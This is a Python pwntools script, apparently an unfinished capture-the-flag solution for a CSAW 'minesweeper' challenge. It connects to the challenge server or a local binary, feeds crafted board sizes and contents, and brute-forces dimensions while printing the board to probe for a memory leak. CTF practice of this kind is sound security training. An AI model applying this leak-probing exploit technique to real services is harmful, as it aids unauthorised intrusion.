#!/usr/bin/env python

from pwn import *

context.timeout = 0.3


with open('payload', 'w') as f:
	f.write('')


def send(conn, line):
	with open('payload', 'a') as f:
		line += '\x0a'
		f.write(line)
	conn.send(line)


def new_game(conn):
	send(conn, "N")

def quit_game(conn):
	send(conn, "Q")

def view_board(conn):
	send(conn, "V")

def uncover_board(conn, x, y):
	send(conn, "U {x} {y}".format(x=x, y=y))

def initialise_game(conn, x, y, dat):
	send(conn, "I")
	conn.recvuntil("Please enter in the dimensions of the board you would like to set in this format: B X Y")
	send(conn, "B {x} {y}".format(x=x, y=y))
	conn.recvuntil("Please send the string used to initialize the board. Please send X * Y bytes follow by a newlineHave atleast 1 mine placed in your board, marked by the character X")
	send(conn, dat)

def game_init(conn, x, y, cx, cy):
	dat = list("0"*x*y)
	dat[cx + x*cy] = "X"
	dat = ''.join(dat)
	initialise_game(conn, x, y, dat)
	return dat

def get_conn(conn):
	dat = ""
	sleep(0.1)
	while conn.can_recv():
		sleep(0.1)
		dat += conn.recv()
	return dat

def do_leak(x,y):
		board = game_init(game, x, y, 1, 0)
		new_game(game)
		get_conn(game)
		view_board(game)
		data = get_conn(game)
		print ''.join(data.split('\n')[y-1:])
		quit_game(game)
		# game.interactive()



prod = False
def setup():
	while True:
		try:
			conn = process('./minesweeper')
			conn.recvuntil("Server started")
			host_args = ('localhost', 31337)
			if prod:
				host_args = ('pwn.chal.csaw.io', 7478)
			game = remote(*host_args)
			game.recvuntil("Hi. Welcome to Minesweeper. Please select an option:")

			return game, conn
		except:
			pass


game, conn = setup()
# x = 25
# y = 48
game.interactive()
exit(0)
x = 48
y = 26

board = game_init(game, x, y, 0, 0)
new_game(game)
get_conn(game)
view_board(game)
data = get_conn(game)
print data
print '--'
print ''.join(data.split('\n'))
game.interactive()
exit(0)
do_leak(3, 4)
exit(0)

for x in range(11, 50):
	for y in range(2, x*2):
		worked = False
		print x
		print y
		try:
			worked = True
			do_leak(x, y)
			do_leak(x, y)
		except:
			worked = False
			game.close()
			conn.close()
			game, conn = setup()



# 8, 3 lags out 
